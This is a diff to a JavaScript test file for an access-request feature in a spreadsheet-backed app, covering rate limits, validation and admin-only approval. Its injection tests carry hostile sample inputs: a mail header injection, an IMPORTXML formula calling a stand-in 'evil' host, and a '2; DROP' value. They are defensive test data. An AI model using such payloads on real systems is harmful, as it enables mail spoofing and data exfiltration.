@@ -14,6 +14,12 @@ function makeDeps(state) {
     verifyToken: (t) => { if (!TOKENS[t]) throw new GatewayError_(401, "bad token"); return TOKENS[t]; },
     cache: { get: (k) => cacheStore[k] || null, put: (k, v) => { cacheStore[k] = v; }, remove: (k) => { delete cacheStore[k]; } },
     lock: (fn) => fn(),
+    requests: {
+      list: () => state.__requests.map((r) => Object.assign({}, r)),
+      add: (r) => { state.__requests.push({ linha: state.__requests.length + 2, data: "2026-09-19", email: r.email, nome: r.nome, empresa: r.empresa, tipo: r.tipo, mensagem: r.mensagem, status: "Pendente", nota: "" }); },
+      setStatus: (linha, status, nota) => { const r = state.__requests.filter((x) => x.linha === linha)[0]; if (r) { r.status = status; r.nota = nota; } },
+    },
+    mail: { send: (m) => { if (state.__mailFail) throw new Error("mail down"); state.__mail.push(m); } },
     registry: { list: () => state.__registry.slice(), add: (e) => { state.__registry.push({ spreadsheetId: e.spreadsheetId, empresa: e.empresa, sheetName: "Lançamento" }); } },
     sheets: {
       getTitles: (id) => Object.keys(state[id]),
@@ -35,7 +41,7 @@ function makeDeps(state) {
 }
 function freshState() {
   return {
-    __created: 0, __registry: [],
+    __created: 0, __registry: [], __requests: [], __mail: [],
     [IPA]: { Lojas: [[]], Contas: [[]], Empresas: [[]], Categoria: [[]], Pessoa: [[]], Produto: [[]], "Tipo de Produto": [[]], Marcas: [[]], "Lançamento": [[]], Estoque: [[]], Usuários: [["Email","Nome","Perfil"], ["viz@x.com","Viz","Visualizador"], ["edi@x.com","Edi","Editor"], ["mas@x.com","Mas","Master"], ["mccomb.matheus@gmail.com","Matheus","Master"]] },
     [CAR]: { "Lançamento": [[]], Estoque: [[]] }, // no Usuários tab yet
   };
@@ -210,6 +216,80 @@ run("a name that already exists (case-insensitive) is refused", "admin", { actio
   results.push((!dup.ok && dup.status === 400 ? "PASS" : "FAIL") + " a second company with the same name is refused");
   const noSelf = step("admin", { action: "createCompany", nome: "Terceira", ownerEmail: "t@x.com", ownerNome: "T", incluirMeuAcesso: false });
   results.push((noSelf.ok && state.NEW2["Usuários"].length === 2 ? "PASS" : "FAIL") + " incluirMeuAcesso=false leaves the admin out of the new company");
+})();
+
+
+// --- access requests (anyone signed in with Google may ask; only the admin sees/answers)
+(function () {
+  const state = freshState();
+  const deps = makeDeps(state); // one deps => the cool-down cache persists between calls
+  TOKENS.stranger = "novato@gmail.com"; TOKENS.stranger2 = "outro@gmail.com";
+  const call = (who, body) => { try { return { ok: true, data: handleRequest(Object.assign({ token: who }, body), deps) }; } catch (e) { return { ok: false, status: e.status, msg: e.message }; } };
+  const good = { action: "requestAccess", nome: "Ana Souza", empresa: "Padaria Ana", tipo: "nova", mensagem: "Quero usar." };
+
+  results.push((!call("zzz", good).ok && call("zzz", good).status === 401 ? "PASS" : "FAIL") + " a request needs a valid Google token");
+  const r1 = call("stranger", good);
+  results.push((r1.ok && r1.data.duplicate === false && state.__requests.length === 1 ? "PASS" : "FAIL") + " a stranger can ask for access");
+  results.push((state.__requests[0].status === "Pendente" && state.__requests[0].email === "novato@gmail.com" ? "PASS" : "FAIL") + " the request is stored as Pendente with the verified e-mail (not one typed by the user)");
+  const mail = state.__mail[0];
+  results.push((mail && mail.to === ADMIN_EMAIL && /Ana Souza/.test(mail.subject) && /Padaria Ana/.test(mail.body) ? "PASS" : "FAIL") + " the administrator is e-mailed with the details");
+  const r2 = call("stranger", good);
+  results.push((!r2.ok && r2.status === 429 ? "PASS" : "FAIL") + " sending again right away is rate-limited");
+  deps.cache.remove("reqcool_novato@gmail.com");
+  const r3 = call("stranger", good);
+  results.push((r3.ok && r3.data.duplicate === true && state.__requests.length === 1 ? "PASS" : "FAIL") + " a second request while one is pending is not stored again");
+
+  // validation
+  const bad = (patch) => { deps.cache.remove("reqcool_outro@gmail.com"); const r = call("stranger2", Object.assign({}, good, patch)); return !r.ok && r.status === 400; };
+  results.push((bad({ nome: "  " }) && bad({ empresa: "" }) && bad({ tipo: "hacker" }) && bad({ nome: { a: 1 } }) ? "PASS" : "FAIL") + " missing/invalid fields are refused (name, company, type, non-strings)");
+  deps.cache.remove("reqcool_outro@gmail.com");
+  const long = call("stranger2", Object.assign({}, good, { nome: "N".repeat(500), mensagem: "M".repeat(5000) }));
+  const stored = state.__requests[state.__requests.length - 1];
+  results.push((long.ok && stored.nome.length === 80 && stored.mensagem.length === 500 ? "PASS" : "FAIL") + " over-long text is cut to the limits");
+
+  // injection: control characters / header injection / formulas
+  const state2 = freshState(); const deps2 = makeDeps(state2);
+  const inj = (() => { try { return handleRequest({ token: "stranger", action: "requestAccess", nome: "Eve\r\nBcc: evil@x.com", empresa: "=IMPORTXML(\"http://evil\")", tipo: "nova", mensagem: "linha1\nlinha2\u0000" }, deps2); } catch (e) { return { err: e.message }; } })();
+  const m2 = state2.__mail[0];
+  results.push((inj.duplicate === false && !/[\r\n]/.test(m2.subject) && state2.__requests[0].nome.indexOf("\n") === -1 && state2.__requests[0].mensagem.indexOf("\u0000") === -1 && state2.__requests[0].mensagem.indexOf("\n") !== -1 ? "PASS" : "FAIL") + " line breaks are removed from short fields and the mail subject; control characters are stripped");
+  results.push((state2.__requests[0].empresa.charAt(0) === "=" ? "PASS" : "FAIL") + " a formula-looking company name is stored as plain text (sheet writes are RAW)");
+
+  // a mail failure must not lose the request
+  const state3 = freshState(); state3.__mailFail = true; const deps3 = makeDeps(state3);
+  let ok3 = false; try { const r = handleRequest({ token: "stranger", action: "requestAccess", nome: "A", empresa: "B", tipo: "nova" }, deps3); ok3 = r.duplicate === false && state3.__requests.length === 1; } catch (e) {}
+  results.push((ok3 ? "PASS" : "FAIL") + " if the notification e-mail fails the request is still saved");
+
+  // pile cap
+  const state4 = freshState(); for (let i = 0; i < MAX_PENDING_REQUESTS; i++) state4.__requests.push({ linha: i + 2, email: "x" + i + "@x.com", status: "Pendente", nome: "n", empresa: "e", tipo: "nova", mensagem: "", nota: "", data: "" });
+  const deps4 = makeDeps(state4); let cap = null; try { handleRequest({ token: "stranger", action: "requestAccess", nome: "A", empresa: "B", tipo: "nova" }, deps4); } catch (e) { cap = e.status; }
+  results.push((cap === 503 ? "PASS" : "FAIL") + " the pending pile has a cap");
+
+  // who may see / answer
+  const lst = (who) => call(who, { action: "listRequests" });
+  results.push((lst("admin").ok && lst("admin").data.pendentes.length >= 1 ? "PASS" : "FAIL") + " the admin lists the pending requests");
+  results.push((!lst("mas").ok && lst("mas").status === 403 && !lst("edi").ok && !lst("viz").ok && !lst("stranger").ok ? "PASS" : "FAIL") + " nobody else can list requests (not even a company Master)");
+  const res = (who, b) => call(who, Object.assign({ action: "resolveRequest" }, b));
+  results.push((!res("mas", { linha: 2, status: "Atendida" }).ok && res("mas", { linha: 2, status: "Atendida" }).status === 403 ? "PASS" : "FAIL") + " a company Master cannot answer requests");
+  results.push((res("admin", { linha: 1, status: "Atendida" }).status === 400 && res("admin", { linha: 2, status: "Aprovada" }).status === 400 && res("admin", { linha: "2; DROP", status: "Atendida" }).status === 400 && res("admin", { linha: 999, status: "Atendida" }).status === 400 ? "PASS" : "FAIL") + " bad row / status / unknown request are refused");
+  const before = state.__mail.length;
+  const okRes = res("admin", { linha: 2, status: "Atendida", nota: "ok" });
+  results.push((okRes.ok && state.__requests[0].status === "Atendida" ? "PASS" : "FAIL") + " the admin marks a request as handled");
+  const notice = state.__mail[state.__mail.length - 1];
+  results.push((state.__mail.length === before + 1 && notice.to === "novato@gmail.com" && /liberado/.test(notice.subject) ? "PASS" : "FAIL") + " the requester is e-mailed when approved");
+  results.push((res("admin", { linha: 2, status: "Recusada" }).status === 400 ? "PASS" : "FAIL") + " an already-answered request cannot be answered again");
+  deps.cache.remove("reqcool_outro@gmail.com");
+  const declineTarget = state.__requests[state.__requests.length - 1];
+  const mailsBefore = state.__mail.length;
+  res("admin", { linha: declineTarget.linha, status: "Recusada", avisar: false });
+  results.push((state.__mail.length === mailsBefore && declineTarget.status === "Recusada" ? "PASS" : "FAIL") + " avisar=false records the answer without sending mail");
+
+  // me() shows the person their own latest request; only when they have no company
+  const meS = call("stranger", { action: "me" });
+  results.push((meS.ok && meS.data.companies.length === 0 && meS.data.pedido && meS.data.pedido.status === "Atendida" ? "PASS" : "FAIL") + " me() tells a company-less person the state of their request");
+  const meN = call("nobody", { action: "me" });
+  results.push((meN.ok && !meN.data.pedido ? "PASS" : "FAIL") + " me() has no 'pedido' for someone who never asked");
+  const meV = call("viz", { action: "me" });
+  results.push((meV.ok && !("pedido" in meV.data) ? "PASS" : "FAIL") + " me() has no 'pedido' for someone who already has a company");
 })();
 
 const failed = results.filter((r) => r.indexOf("FAIL") === 0);
